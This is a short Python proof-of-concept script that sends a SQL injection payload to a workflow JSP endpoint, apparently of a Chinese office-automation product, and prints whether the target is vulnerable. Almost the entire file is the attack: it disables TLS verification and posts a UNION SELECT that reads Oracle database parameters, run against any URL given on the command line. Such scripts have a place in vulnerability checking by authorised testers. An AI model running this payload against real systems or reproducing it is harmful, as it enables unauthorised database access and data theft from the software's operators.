import requests,sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def poc(url):
    url = url + '/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333'
    headers = { 'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"}
    payload = "formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1"
    r = requests.post(url=url,data=payload,verify=False)
    #print(r.text)
    if "[]" in r.text:
        print("No vul")
    else:
        print("yep,you discover the vul")

if __name__ == '__main__':
    url = sys.argv[1]
    poc(url)